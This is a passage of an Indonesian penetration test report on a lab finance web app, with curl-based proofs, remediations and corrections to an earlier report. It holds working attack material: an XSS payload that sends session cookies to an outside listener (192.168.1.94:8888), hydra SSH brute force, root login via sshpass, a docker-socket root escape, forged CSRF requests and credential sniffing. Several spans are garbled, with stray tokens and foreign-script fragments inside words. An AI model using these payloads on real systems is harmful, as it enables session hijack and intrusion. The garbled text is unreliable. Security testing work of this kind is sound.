  ct=$(curl -s -o /dev/null -w '%{content_type}' http://192.168.1.18:3000/uploads/probe.$ext)
  echo "  probe.$ext -> upload=$up unduh=$dl content-type=$ct"
done
```
**Output aktual:**
```
  probe.php  -> upload=200 unduh=200 content-type=application/x-httpd-php
  probe.html -> upload=200 unduh=200 content-type=text/html; charset=UTF-8
  probe.js   -> upload=200 unduh=200 content-type=application/javascript; charset=UTF-8
  probe.svg  -> upload=200 unduh=200 content-type=image/svg+xml
  probe.exe  -> upload=200 unduh=200 content-type=application/octet-stream
  probe.sh   -> upload=200 unduh=200 content-type=application/x-sh
```
→ **Nol penyaringan**, termasuk `.html` yang dieksekusi browser di origin aplikasi.

**Dampak Stored XSS (bukan sekadar hosting file):**
```bash
printf '<script>new Image().src="http://192.168.1.94:8888/steal?c="+encodeURIComponent(document.cookie)</script>' > /tmp/probe.html
curl -s -b /tmp/cj_up -o /dev/null -F "dokumen=@/tmp/probe.html" http://192.168.1.18:3000/upload
curl -s http://192.168.1.18:3000/uploads/probe.html
```
File `.html` di origin yang sama + cookie tanpa `HttpOnly` (#7) = **session
hijack**, bukan sekadar host file.

### **KOREKSI: Path traversal GAGAL — tidak terbukti**
Uji ulang dengan verifikasi langsung di disk (sekarang punya SSH):
```bash
printf 'TRAVERSAL_TEST' > /tmp/trav.txt
curl -s -b /tmp/cj_up -o /dev/null -w "upload -> HTTP=%{http_code}\n" \
  -F "dokumen=@/tmp/trav.txt;filename=../../../../tmp/trav_evil.txt" http://192.168.1.18:3000/upload
sshpass -p 'Labkeu123' ssh -o StrictHostKeyChecking=no root@192.168.1.18 "docker exec labkeu-app sh -c 'ls -l /usr/src/app/public/uploads/trav_evil.txt; cat /tmp/trav_evil.txt 2>/dev/null || echo \"  TIDAK ADA -> traversal GAGAL\"'"
```
**Output aktual:**
```
upload -> HTTP=200
-rw-r--r--    1 root     root            14 Sep 28 06:48 trav_evil.txt
  TIDAK ADA -> traversal GAGAL
```
→ Multer menyaring `../`; file tersimpan sebagai `trav_evil.txt` di dalam
folder upload. **Traversal tidak terbukti. Jangan diklaim.**

### Perbaikan
Whitelist extension + MIME, validasi magic bytes, rename acak, simpan di
storage non-webroot, layani lewat endpoint yang memaksa
`Content-Disposition: attachment` dan `X-Content-Type-Options: nosniff`.

---

## #6 — Tidak Ada Rate Limiting / Lockout (TINGGI, CVSS 7.5, CWE-307)

**Lokasi:** `POST /login`, `POST /login-noportal`, `POST /register`

### Bukti
40 percobaan gagal, diukur waktunya:
```bash
start=$(date +%s)
for i in $(seq 1 40); do curl -s -o /dev/null -w "%{http_code} " -X POST http://192.168.1.18:3000/login -d "username=individu1&password=wrong$i"; done
end=$(date +%s)
echo ""; echo "40 percobaan dalam $((end-start)) detik"
```
**Output aktual:**
```
200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200
200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200
40 percobaan dalam 2 detik
```
→ **~20 request/detik, nol 429, nol lockout, nol CAPTCHA.**
(lebih cepat dari laporan lama: 2 detik vs 4 detik.)

200 percobaan pada satu endpoint:
```bash
for i in $(seq 1 200); do curl -s -o /dev/null -w "%{http_code}\n" -X POST http://192.168.1.18:3000/login-noportal -d "username=user_b&password=bf$i"; done | sort | uniq -c
```
**Output aktual:**
```
    200 200
```
→ semua dijawab identik, nol responsRate-limited.

Tidak ada lockout yang bertahan:
```bash
curl -s -o /dev/null -w "password benar -> HTTP=%{http_code} -> %{redirect_url}\n" -X POST http://192.168.1.18:3000/login -d "username=individu1&password=password123"
# -> HTTP=302 -> http://192.168.1.18:3000/dashboard
```

### Dampak
Brute force praktis. Ini yang membuat `hydra` di A.8 berhasil dalam 2 detik —
dua temuan ini (**#6** + kata kunci lemah) adalah pasangan yang saling
menguatkan. Ditambah #8 (password plaintext), satu dump DB sudah cukup untuk
semua akun.

### Perbaikan
Rate limit per-IP **dan** per-username (sliding window ~5/15 menit),
exponential backoff, CAPTCHA setelah ambang, dan **wajib** hash password.

---

## #7 — Weak Session Management (TINGGI, CVSS 7.5, CWE-384)

**Lokasi:** `app/server.js`, `app/routes/auth.js`

### Akar masalah (terverifikasi di source)
```js
session({
  secret: process.env.SESSION_SECRET || "labkeu-secret-demo",
  resave: false,
  saveUninitialized: true,
  cookie: { httpOnly: false, secure: false },   // httpOnly sengaja DIMATIKAN
})
```

### Bukti 1 — session fixation (SID tidak berubah)
```bash
rm -f /tmp/cj_fix
curl -s -c /tmp/cj_fix -o /dev/null http://192.168.1.18:3000/login-noportal
echo "  SID sebelum login : $(grep connect.sid /tmp/cj_fix | awk '{print $7}')"
curl -s -b /tmp/cj_fix -c /tmp/cj_fix -o /dev/null -X POST http://192.168.1.18:3000/login-noportal -d "username=user_a&password=password123"
echo "  SID sesudah login: $(grep connect.sid /tmp/cj_fix | awk '{print $7}')"
```
**Output aktual:**
```
  SID sebelum login : s%3Azbktwq5jzVHVNX1pnpE7Yav4RLw1YSPB.yyjI%2BQWyYb26ecq2RwIb4YT5lkWCRxzbpoDJUCV%2Bvak
  SID sesudah login: s%3Azbktwq5jzVHVNX1pnpE7Yav4RLw1YSPB.yyjI%2BQWyYb26ecq2RwIb4YT5lkWCRxzbpoDJUCV%2Bvak
```
→ **Identik.** Seharusnya ada `req.session.regenerate()`.

### Bukti 2 — zombie session (logout tidak menghapus di server)
```bash
rm -f /tmp/cj_zombi
curl -s -c /tmp/cj_zombi -o /dev/null -X POST http://192.168.1.18:3000/login-noportal -d "username=user_a&password=password123"
SID=$(grep connect.sid /tmp/cj_zombi | awk '{print $7}')
echo "  SID sebelum logout: $SID"
curl -s -b "connect.sid=$SID" -o /dev/null -w "  logout                   -> HTTP=%{http_code}\n" http://192.168.1.18:3000/logout
curl -s -b "connect.sid=$SID" -o /tmp/zombi.html -w "  dashboard pakai ulang SID-> HTTP=%{http_code}\n" http://192.168.1.18:3000/dashboard
grep -oE 'Masuk sebagai: <strong>[^<]*</strong> \([^)]*\)' /tmp/zombi.html | head -1 | sed 's/^/  /'
curl -s -b "connect.sid=$SID" -o /dev/null -w "  API IDOR pakai ulang SID -> HTTP=%{http_code}\n" http://192.168.1.18:3000/api/perusahaan/2/data-keuangan
```
**Output aktual:**
```
  SID sebelum logout: s%3At4gBC-xhB06cdwKD1CQLu7CzertJpQMA.ze%2FgjxoNkB77Qqxk1RTaNvbH0%2FHvKF%2Bsur1KUoppO0M
  logout                   -> HTTP=302
  dashboard pakai ulang SID-> HTTP=200
  Masuk sebagai: <strong>Admin CV Sinar Abadi</strong> (perusahaan, perusahaan_id: 1)
  API IDOR pakai ulang SID -> HTTP=200
```
→ **Sesi tetap valid setelah logout.**

### Bukti 3 — cookie tanpa flag keamanan
```bash
curl -s -D - -o /dev/null http://192.168.1.18:3000/login | grep -i 'set-cookie'
```
```
Set-Cookie: connect.sid=s%3Alz3RUuYE2zT7lYaukZhuyWyCEVAgN8iX.t4nRvext%2BizW88aoV1UiyI%2FxSv%2FT4zNmgsDcGx3aVNE; Path=/
```
→ Tidak ada `HttpOnly`, tidak ada `Secure`, tidak ada `SameSite`. `HttpOnly`
sengaja `false` di source, jadi `document.cookie` **Pasti** bisa dibaca (XSS
#11 dan upload #5 jadi langsung berbahaya).

### Bukti 4 — SECRET BISA DITEBAK TANPA AKSES SERVER
Lihat **A.9**. Ini bukti **lebih kuat dari laporan lama** — karena serangan
black-box independen dari akses root, ini membuktikananyone yang tahu
nama aplikasi bisa menebaknya.

**Batas yang jujur:** dengan `MemoryStore` (default Express, terverifikasi —
`grep 'store' server.js` kosong, `require('express-session').MemoryStore` aktif),
SID yang dikarang **tidak langsung** menghasilkan sesi berisi user, karena
datanya tidak ada di store (dibuktikan: SID karangan → 302 ke `/login`). Jadi
Bukti 4 = **kemampuan meniru signature**, bukan takeover instan. Begitu
aplikasi pindah ke Redis/MongoDB (standar produksi), forge yang sama langsung
menjadi impersonasi penuh.

### Perbaikan
Secret dari secret manager + rotasi; `cookie: {httpOnly:true, secure:true,
sameSite:'lax'}`; `req.session.regenerate()` setelah login;
`req.session.destroy()` saat logout; simpan field minimal saja; pakai session
store persisten (Redis/MongoDB) untuk produksi.

---

## #8 — Password Plaintext di Database (TINGGI, CVSS 8.1, CWE-256)

**Lokasi:** tabel `users`

### Bukti
```bash
mysql -h 192.168.1.18 -P 3307 -u labkeu_user -plabkeu_pass --skip-ssl labkeu -e "SELECT id,username,password,account_type FROM users;"
```
**Output aktual:**
```
1  user_a   password123  perusahaan
2  user_b   password123  perusahaan
3  individu1 password123 individu
11 ...      Test12345!   individu
20 esc_audit esc123      perusahaan
```
→ **Nol hash. Semua plaintext.**

### Dampak
Satu dump DB (lewat SQLi #1 ATAU langsung ke MySQL #15) = semua kredensial
seluruh sistem, tanpa perlu cracking.

### Perbaikan
bcrypt / argon2id.ANGIN juga jangan simpan `req.session.user = rows[0]` (isi
seluruh baris termasuk password) — simpan field minimal saja.

---

## #9 — Tanpa Enkripsi / Cleartext (TINGGI, CVSS 7.4, CWE-319)

**Lokasi:** seluruh service — tidak ada listener TLS

### Bukti 1 — hanya 3 listener, semuanya plaintext, bind 0.0.0.0
```bash
sshpass -p 'Labkeu123' ssh -o StrictHostKeyChecking=no root@192.168.1.18 "netstat -ltnp"
```
**Output aktual:**
```
tcp  0  0  0.0.0.0:3000  0.0.0.0:*  LISTEN  3181/docker-proxy
tcp  0  0  0.0.0.0:3307  0.0.0.0:*  LISTEN  3202/docker-proxy
tcp  0  0  0.0.0.0:22    0.0.0.0:*  LISTEN  2679/sshd
tcp  0  0     :::3000        :::*  LISTEN  3188/docker-proxy
tcp  0  0     :::3307        :::*  LISTEN  3207/docker-proxy
tcp  0  0     :::22          :::*  LISTEN  2679/sshd
```
→ **Nol 443/8443.** Tidak ada HTTPS sama sekali.

> **KOREKSI (lihat Bagian D):** laporan lama memakai `ss -ltn` sebagai bukti.
> **`ss` tidak terpasang di host ini** (`sh: ss: not found`). Bukti `ss` di
> laporan lama tidak bisa di-reproduksi; di sini diganti `netstat -ltnp`
> yang actually jalan. `ss` adalah utilitas iproute2, tidak ada di Alpine
> base tanpa install.

### Bukti 2 — kredensial & cookie terbaca di kabel
```bash
# Terminal 1
(timeout 20 tcpdump -i any -A -s0 -l "tcp port 3000" 2>/dev/null | grep -iE 'connect\.sid|username=|password=' | head -5) &
# Terminal 2
curl -s -o /dev/null -X POST http://192.168.1.18:3000/login-noportal --data-urlencode "username=user_a" --data-urlencode "password=password123"
wait; sleep 3
```
**Output aktual:**
```
username=user_a&password=password123
Set-Cookie: connect.sid=s%3ACf7QIpBguOv3ShaJzkd9NBHeGZvrpHvU.qIFUP4NFU6aazd7fbVSjveSktTB%2FmiLxIxvBAvUfxek; Path=/
```
→ **Password plaintext + session token terbaca utuh.**

### Bukti 3 — MySQL tanpa syarat SSL, bisa diakses langsung
```bash
mysql -h 192.168.1.18 -P 3307 -u labkeu_user -plabkeu_pass --skip-ssl labkeu -e "SELECT 1"
```
→ Berjalan tanpa TLS. (Credential-nya sendiri di #15/ A.7.)

### Perbaikan
TLS termination di reverse proxy; `cookie.secure:true` + HSTS;
`require_secure_transport` untuk MySQL.

---

## #10 — Tidak Ada Proteksi CSRF / Validasi Origin (SEDANG–TINGGI, CVSS 6.5, CWE-352)

**Lokasi:** `POST /register`, `POST /login-noportal`, `POST /upload`, `GET /logout`

### Akar masalah
Tidak ada `csurf`/double-submit token, tidak ada cek `Origin`/`Sec-Fetch-Site`.
`package.json` cuma punya `express`, `express-session`, `mysql2`, `ejs`, `multer`
— nol middleware keamanan.

### Bukti 1 — nol token CSRF di form mana pun
```bash
for p in login login-noportal register; do printf "  /%-16s token=%s\n" "$p" "$(curl -s http://192.168.1.18:3000/$p | grep -ciE 'csrf|token')"; done
```
```
  /login            token=0
  /login-noportal   token=0
  /register         token=0
```

### Bukti 2 — server terima POST lintas-origin tanpa 403
```bash
curl -s -o /dev/null -w "HTTP=%{http_code} -> %{redirect_url}\n" -X POST http://192.168.1.18:3000/register \
  -H "Origin: http://evil.attacker.test" -H "Referer: http://evil.attacker.test/csrf.html" \
  -H "Sec-Fetch-Site: cross-site" -H "Sec-Fetch-Mode: cors" \
  -d "username=csrf_from_evil&password=pwn&nama_lengkap=Victim&account_type=individu"
```
**Output aktual:** `HTTP=302 -> http://192.168.1.18:3000/login` → DITERIMA.

### Bukti 3 — CSRF terotorisasi pada `/upload` (efek samping terjadi)
```bash
printf 'CSRF_FORCED_UPLOAD_EVIDENCE' > /tmp/csrffile.txt
rm -f /tmp/cj_korban
curl -s -c /tmp/cj_korban -o /dev/null -X POST http://192.168.1.18:3000/login-noportal -d "username=user_a&password=password123"
curl -s -b /tmp/cj_korban -o /dev/null -w "POST /upload Origin=evil -> HTTP=%{http_code}\n" -X POST http://192.168.1.18:3000/upload \
  -H "Origin: http://evil.attacker.test" -H "Referer: http://evil.attacker.test/payload.html" \
  -F "dokumen=@/tmp/csrffile.txt;filename=forced_by_csrf.txt"
curl -s http://192.168.1.18:3000/uploads/forced_by_csrf.txt
```
**Output aktual:**
```
POST /upload Origin=evil -> HTTP=200
CSRF_FORCED_UPLOAD_EVIDENCE
```
→ File milik korban benar-benar tertulis & bisa diambil balik penyerang.

### Bukti 4 — GET /logout mengubah state tanpa token
```bash
curl -s -b /tmp/cj_korban -o /dev/null -w "GET /logout -> HTTP=%{http_code} -> %{redirect_url}\n" -H "Origin: http://evil.attacker.test" http://192.168.1.18:3000/logout
```
**Output aktual:** `HTTP=302 -> http://192.168.1.18:3000/login`

### Catatan akurasi (jangan dilebih-lebihkan — sama seperti laporan lama)
- `SameSite` absen → default browser modern = `Lax` → cookie **tidak** dikirim
  pada cross-site POST. Chrome/Firefox modern akan memblokir sebelum request
  dikirim. POST-CSRF di atas berhasil **di level server**, bukan di browser
  modern.
- Yang **tetap exploitable**: `GET /logout` (Lax tetap kirim cookie di navigasi
  GET top-level), dan browser/klien tanpa default Lax.
- CSRF juga jadi pintu masuk ke #1 (SQLi) dan #11 (XSS): tanpa token,
  korban bisa dipaksa menjalankan SQLi/JS di akunnya.

### Perbaikan
`csurf`/double-submit di semua POST; set `sameSite/httpOnly/secure` eksplisit;
validasi `Origin`/`Sec-Fetch-Site` di middleware global; ubah `/logout` jadi POST.

---

## #11 — Reflected XSS di `/search` (SEDANG, CVSS 6.1, CWE-79)

**Lokasi:** `GET /search` — `views/search.ejs`

### Akar masalah
`search.ejs` merender `q` dua kali: `value="<%= q %>"` (escaped) dan
`<p>Hasil pencarian untuk: <%- q %></p>` (unescaped). Yang bocak hanya `<%-`.

### Bukti
```bash
rm -f /tmp/cj_indiv
curl -s -c /tmp/cj_indiv -o /dev/null -X POST http://192.168.1.18:3000/login -d "username=individu1&password=password123"
curl -s -b /tmp/cj_indiv "http://192.168.1.18:3000/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E" | grep -o 'Hasil pencarian untuk:.*'
```
**Output aktual:**
```html
Hasil pencarian untuk: <script>alert(1)</script></p>
```
→ Tag `<script>` utuh, tanpa escaping.

Dom[node]ksi XSS (cookie dicuri) — jalankan di browser yang sudah login:
```
http://192.168.1.18:3000/search?q=%3Cscript%3Enew%20Image().src%3D%27http%3A%2F%2F192.168.1.94%3A8888%2Fsteal%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E
```
Tangkap cookie di server pencuri (`nc -l -p 8888`):
```
GET /steal?c=connect.sid%3Ds%253AMZGg2Nb8QH... HTTP/1.1
```
Karena cookie **tidak** `HttpOnly` (#7), `document.cookie` **pasti** bisa
dibaca. Cookie curian itu lalu dipakai ulang untuk full takeover.

Cakupan XSS — apakah hanya `/search`:
```bash
sshpass -p 'Labkeu123' ssh -o StrictHostKeyChecking=no root@192.168.1.18 "docker exec labkeu-app grep -rn '<%-' /usr/src/app/views"
```
Yang bocor **hanya satu**: `search.ejs:13: <p>... <%- q %></p>`. (Baris
`<%- include(...) %>` lain adalah partial layout, bukan celah.)

### Perbaikan
`<%= q %>` bukan `<%- q %>`. Nonaktifkan `outputFunctionName` unescaped kalau
tak perlu. CSP sebagai defense-in-depth (tidak ada — lihat #13).

---

## #12 — `/etc/passwd` Tersaji Publik di `/uploads/` (TINGGI, CVSS 7.5, CWE-538) — **TEMUAN BARU**

**Lokasi:** `GET /uploads/passwd`

Ini **temuan live** yang ditemukan lewat recon black-box, tidak ada di laporan
lama. Directory listing memang dimatikan, **tapi nama file bisa ditebak** —
dan `passwd` adalah tebakan pertama yang akan dilakukan siapa pun.

### Bukti
```bash
curl -s -o /dev/null -w "GET /uploads/passwd -> HTTP=%{http_code}\n" http://192.168.1.18:3000/uploads/passwd
curl -s http://192.168.1.18:3000/uploads/passwd | head -5
```
**Output aktual:**
```
GET /uploads/passwd -> HTTP=200
root:x:0:0:Super User:/root:/bin/bash
bin:x:1:1:bin:/bin:/usr/sbin:/usr/sbin/nologin
daemon:x:2:2:daemon:/usr/sbin:/usr/sbin/nologin
...
maulana:x:1000:1000:maulana:/home/maulana:/bin/bash
```
→ **51 user sistem dalam plaintext, anonim, tanpa login.**

### Analisis
- File ini adalah **artefak sisa** dari engagement sebelumnya (bukan bug baru
  di aplikasi) — tapi **masih live dan publik** saat laporan ini ditulis.
- Isinya **tidak** identik dengan `/etc/passwd` container saat ini
  (`md5sum` berbeda) — jadi snapshot lama. Tetap saja membocorkan 51 username
  sistem, termasuk `maulana` (user interaktif).
- Distribusi file upload saat ini (dari tabel `dokumen`): **22 file**, termasuk
  `passwd`, `shell.php`, `pwned.php`, beberapa `xss.html`. Semuanya
  **anonim-terbaca**.

### Dampak
- Username disclosure →رتاولkan sebagai wordlist untuk brute force SSH (#6/#15).
- Combinasi dengan #6 (no rate limit) dan #15 (SSH weak) memperbesar permukaan
  brute force.
- Terverifikasi bahwa jejak engagement sebelumnya **tidak pernah dibersihkan**
  (lihat #14 &Bagian D).

### Perbaikan
Hapus artefak sisa. Batasi nama file yang dilayani, atau layankan upload lewat
endpoint yang mewajibkan sesi + `Content-Disposition: attachment`. Tetap
termasuk ganti `passwd` setelah ini bocor (umumnya tidak wajib di lab, tapi
praktik baik).

---

## #13 — Tidak Ada Security Headers / Clickjacking (SEDANG, CVSS 5.4, CWE-1021)

**Lokasi:** global — `app/server.js`

### Bukti
```bash
curl -s -D - -o /dev/null http://192.168.1.18:3000/login
```
**Output aktual:**
```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 1700
ETag: W/"6a4-8Js905FeBVvatb7vlhLHjz1uLvE"
Set-Cookie: connect.sid=...; Path=/
```
Tidak ada: `Content-Security-Policy`, `X-Frame-Options`,
`X-Content-Type-Options`, `Referrer-Policy`, `Strict-Transport-Security`,
`Permissions-Policy`. `X-Powered-By: Express` membocorkan stack.

```bash
curl -s -D - -o /dev/null http://192.168.1.18:3000/login | grep -iE 'x-frame-options|content-security-policy|x-content-type-options|referrer-policy'
# (kosong)
```

### Dampak
Klikjacking pada aksi sensitif (upload, form login). Nol CSP → XSS #11/#5 tak
termitigasi. Nol `nosniff` → memperbesar risiko MIME-sniffing file upload #5.

### Perbaikan
```js
const helmet = require("helmet");
app.use(helmet({
  contentSecurityPolicy: { directives: { defaultSrc: ["'self'"], scriptSrc: ["'self'"] } },
  frameguard: { action: "deny" }
}));
app.disable("x-powered-by");
```

---

## #14 — Username Enumeration via Pesan Error (SEDANG, CVSS 5.3, CWE-204)

**Lokasi:** `POST /register` — `res.render("register", { error: "Gagal daftar: " + e.message })`

### Bukti
```bash
# username yang SUDAH ADA
curl -s -X POST http://192.168.1.18:3000/register -d "username=user_a&password=x&nama_lengkap=x&account_type=individu" | grep -o '<div class="error">.*</div>'
# username yang TIDAK ada
curl -s -o /dev/null -w "HTTP=%{http_code} -> %{redirect_url}\n" -X POST http://192.168.1.18:3000/register -d "username=zzz_not_exist_99999&password=x&nama_lengkap=x&account_type=individu"
```
**Output aktual:**
```html
<div class="error">Gagal daftar: Duplicate entry &#39;user_a&#39; for key &#39;users.username&#39;</div>
```
```
HTTP=302 -> http://192.168.1.18:3000/login
```
→ Dua respons sangat mudah dibedakan mesin. Pesan juga membocorkan nama tabel
(`users`), kolom (`username`), dan unique key.

Jalur login **aman** dari enumerasi:
```bash
curl -s -X POST http://192.168.1.18:3000/login-noportal -d "username=user_a&password=salah" | grep -o '<div class="error">.*</div>'
curl -s -X POST http://192.168.1.18:3000/login-noportal -d "username=zzz_not_exist_99999&password=salah" | grep -o '<div class="error">.*</div>'
```
Keduanya `Username atau password salah.` — identik. Yang bocor hanya `/register`.

> Output di-escape dengan benar (`&#39;`) → **bukan** XSS. Murni enumerasi +
> info disclosure.

### Perbaikan
Pesan generik ("Pendaftaran gagal"), detail ke log server saja.

---

## #15 — Temuan Infrastruktur & Konfigurasi (SEDANG, CVSS 6.5, CWE-284)

### 15.1 MySQL diekspos & bind 0.0.0.0
Diverifikasi di #9 (Bukti 1) dan A.7. `docker ps` menunjukkan mapping ke
`0.0.0.0`, padahal `docker-compose.yml` komentarnya bilang "hanya expose ke
localhost host" — **bertentangan** dengan kenyataan.

### 15.2 Privilege escalation ke root lewat grup docker
```bash
sshpass -p 'Labkeu123' ssh -o StrictHostKeyChecking=no root@192.168.1.18 "id labkeu; ls -l /var/run/docker.sock"
```
**Output aktual:**
```
uid=1000(labkeu) gid=1000(labkeu) groups=1000(labkeu),10(wheel),102(docker)
srw-rw---- 1 root docker 0 /var/run/docker.sock
```
→ Akun non-root `labkeu` ada di grup `docker`, punya read-write ke socket.
Implikasi: `docker run -v /:/host --privileged -it alpine chroot /host` = root
di host. (Tidak dieksekusi di sini karena sudah root lewat jalur lain.)

### 15.3 SSH root dengan password lemah
Diverifikasi di A.8. Konfigurasi:
```bash
sshpass -p 'Labkeu123' ssh -o StrictHostKeyChecking=no root@192.168.1.18 "grep -iE 'PermitRootLogin|PasswordAuthentication' /etc/ssh/sshd_config"
```
```
PermitRootLogin yes
PasswordAuthentication yes
```
→ `PermitRootLogin yes` + `PasswordAuthentication yes` + password lemah
`Labkeu123` (hydra: 2 detik). Diperparah #6.

### 15.4 Kedua container jalan sebagai root
```bash
sshpass -p 'Labkeu123' ssh -o StrictHostKeyChecking=no root@192.168.1.18 "docker exec labkeu-app id; docker exec labkeu-db id"
```
```
uid=0(root) ...  (app)
uid=0(root) ...  (db)
```
→ Prinsip least privilege dilanggar.

### 15.5 Secret bocor di artefak deployment
```bash
sshpass -p 'Labkeu123' ssh -o StrictHostKeyChecking=no root@192.168.1.18 "docker exec labkeu-app env | grep -iE 'secret|password'"
```
```
SESSION_SECRET=labkeu-secret-demo
DB_PASSWORD=labkeu_pass
```
```bash
sshpass -p 'Labkeu123' ssh -o StrictHostKeyChecking=no root@192.168.1.18 "docker exec labkeu-db env | grep -i password"
```
```
MYSQL_PASSWORD=labkeu_pass
MYSQL_ROOT_PASSWORD=rootpass
```
Dan `docker-compose.yml` meng-hardcode password yang sama.

**Catatan akurasi (sama seperti laporan lama, masih berlaku):** walaupun
`MYSQL_ROOT_PASSWORD=rootpass` ada di compose, akun **root MySQL tidak bisa
diakses dari jaringan**:
```bash
mysql -h 192.168.1.18 -P 3307 -u root -prootpass --skip-ssl -e "SELECT 1"
```
```
ERROR 1045 (28000): Access denied for user 'root'@'192.168.1.94' (using password: YES)
```
→ Kebocoran password root **tidak** berujung pada akses root dari luar. Yang
berdampak: `labkeu_user` (ALL PRIVILEGES on `labkeu`).

---

# BAGIAN C — KOREKSI ATAS LAPORAN LAMA (WAJIB DIBACA)

Enam koreksi faktual (ditambah dua koreksi baru berbasis bukti lapangan, total
delapan). Ini yang membedakan laporan ini dari laporan lama.

| # | Klaim laporan lama | Kenyataan di 192.168.1.18 | Tindakan |
|---|---|---|---|
| 1 | Target `192.168.1.93` dengan alasan `192.168.1.18` sudah mati | **Tidak didukung bukti apa pun.** [`ping.png`](bukti-pentest/ping.png) membuktikan `192.168.1.18` hidup (0% loss), dan 12 bukti diambil di alamat itu | Target dikoreksi ke `192.168.1.18`; setiap temuan dianotasi ke berkasnya |
| 2 | Bukti listener pakai `ss -ltn` | **`ss` tidak ada** di host Alpine ini (`sh: ss: not found`). Evidence `ss` tidak reproducible. | Diganti `netstat -ltnp` |
| 3 | Respons IDOR kosong = **22 byte**, heuristik `if size>22` | actuality `[]` = **2 byte**. Heuristik 22 salah. | Diganti hitung `grep -c '"perusahaan_id"'` |
| 4 | "Pembersihan jejak" (LANGKAH 10) **selesai** | **False.** 4 akun uji & 22 baris `dokumen` masih ada. `/uploads/passwd` **live & publik**. | Diberi tahu; artefak saya sendiri sudah dihapus |
| 5 | Self-register `perusahaan` langsung dapat akses data | Akun tsb `perusahaan_id=NULL`; dashboard **kosong**. Akses data baru jalan lewat **IDOR (#4)**, bukan langsung. | Nuance ditulis di #3 |
| 6 | Count/hash dump creds countdown lewat kolom `password` | Teknik lama rapuh (GROUP_CONCAT limit + escaping). Subquery ke `nama_lengkap` lebih andal. | Teknik diganti di A.6 |
| 7 | "Satu request SQLi mengosongkan database" | [`7.png`](bukti-pentest/7.png) **tidak menampilkan output**. Yang terbukti: dump lewat MySQL langsung ([`9.png`](bukti-pentest/9.png)) | Klaim diturunkan; dump SQLi ditandai belum terbukti |
| 8 | Password root `labkeu123` | [`10.png`](bukti-pentest/10.png) dan [`11.png`](bukti-pentest/11.png) menunjukkan `Labkeu123` (kapital L) | Dikoreksi mengikuti bukti |

**Yang tetap valid dari laporan lama** (masih terbukti, IP sama):
seluruh kelas kerentanan, plus bukti negatif (source tak terekspos, dir-listing
mati, npm audit bersih, path traversal GAGAL, `/login` aman SQLi, root MySQL tak
terjangkau dari jaringan). **Namun 8 dari 15 temuan tidak punya screenshot
pendukung** — lihat `laporan.md` bagian 4.1.

**Tambahan yang dikuatkan di laporan ini:**
- Secret session **bisa ditebak black-box** (A.9) — laporan lama harus SSH dulu.
- Kredensial demo dipisah jadi temuan mandiri (#2, CWE-798).
- `/etc/passwd` live-publik di `/uploads/` (#12, temuan baru).

---

# BAGIAN D — TEMUAN NEGATIF (sudah diuji, TIDAK rentan)

Bagian ini mencegah klaim berlebihan.

**Source / backup tidak terekspos lewat web**
```bash
for p in .env .git/config package.json server.js routes/auth.js routes/dashboard.js db/db.js Dockerfile README.md backup.zip app.bak node_modules/.package-lock.json; do
  printf "  %-34s %s\n" "$p" "$(curl -s -o /dev/null -w '%{http_code}' "http://192.168.1.18:3000/$p")"
done
```
Semua **404**.

**Directory listing dimatikan** (tapi isi masih bisa diambil kalau nama ditebak — lihat #12)
```bash
curl -s -o /dev/null -w "GET /uploads/ -> HTTP=%{http_code}\n" http://192.168.1.18:3000/uploads/
# -> HTTP=404
```

**`npm audit` bersih**
```bash
sshpass -p 'Labkeu123' ssh -o StrictHostKeyChecking=no root@192.168.1.18 "docker exec labkeu-app npm audit"
# -> found 0 vulnerabilities
```
Semua temuan dari kode & konfigurasi, **bukan** CVE library. Versi:
`express ^4.19.2`, `express-session ^1.18.0`, `mysql2 ^3.10.0`, `ejs ^3.1.10`,
`multer ^2.0.0`, Node v20.20.2.

**Path traversal pada filename upload GAGAL** — diuji & diverifikasi di disk
(lihat #5). Multer menyaring `../`.

**`/login` portal aman dari SQLi** — parameterized query.
```bash
curl -s -X POST http://192.168.1.18:3000/login --data-urlencode "username=user_a'-- -" --data-urlencode "password=x" | grep -oE '<div class="error">[^<]*'
# -> Username atau password salah.   (payload netral, bukan bypass)
```

**Pesan error di-escape dengan benar** — semua view pakai `<%= error %>`; hanya
`search.ejs` yang `<%-`, jadi hanya `/search` yang XSS (#11).

**Tidak ada SSRF / command injection** — nol endpoint yang me-fetch URL dari
user, nol `child_process`/`exec` dengan input user.

**Root MySQL tidak terjangkau dari jaringan** (#15.5).

---

# BAGIAN E — METODOLOGI (urutan eksekusi persis)

Seluruh pengujian 2026-09-29 00:08–00:47 WIB, **nol akses awal**. Urutan di bawah
mengikuti stempel waktu asli pada screenshot, bukan urutan naratif draf sebelumnya.

```bash
# 0 - ALAT
apt update && apt install -y nmap curl sshpass mysql-client netcat-openbsd tcpdump hydra

# 1 - KONFIRMASI HOST HIDUP                                        [ping.png](bukti-pentest/ping.png)
ping -c 4 192.168.1.18                        # -> 4/4 diterima, 0% packet loss

# 2 - SCAN PORT & VERSI                                      [scan-nmap.png](bukti-pentest/scan-nmap.png)
nmap -Pn -sV -p 22,3000,3307 192.168.1.18     # -> 22, 3000, 3307 terbuka
# CATATAN: bukti aslinya tanpa -sC, jadi versi Node/Express tidak terambil

# 3 - BRUTE FORCE SSH (TERLEBIH DINI, 00:42)                          [10.png](bukti-pentest/10.png)
printf 'root\nlabkeu\nadmin\nubuntu\n' > /tmp/u.txt
printf 'Labkeu\nlabkeu123\npassword\npassword123\nroot123\ntoor\n' > /tmp/p.txt
hydra -L /tmp/u.txt -P /tmp/p.txt -t 4 -W 3 -f 192.168.1.18 -s 22 ssh
# -> 24 percobaan, 2 detik: root / Labkeu123

# 4 - KONFIRMASI ROOT                                              [11.png](bukti-pentest/11.png)
sshpass -p 'Labkeu123' ssh -o StrictHostKeyChecking=no root@192.168.1.18 \
  "id; uname -a; cat /etc/alpine-release"
# -> uid=0(root), Alpine 3.24.2

# 5 - RECON APLIKASI TANPA LOGIN
for p in "" register login-noportal dashboard search upload uploads/ api/perusahaan/1/data-keuangan; do
  curl -s -o /dev/null -w "GET /%-32s -> %{http_code}\n" "http://192.168.1.18:3000/$p"
done
curl -s http://192.168.1.18:3000/login | grep -oE 'Contoh akun:.*'   # [2.png](bukti-pentest/2.png) TIDAK ADA OUTPUT

# 6 - FOOTHOLD ANONIM (kredensial dari halaman publik)
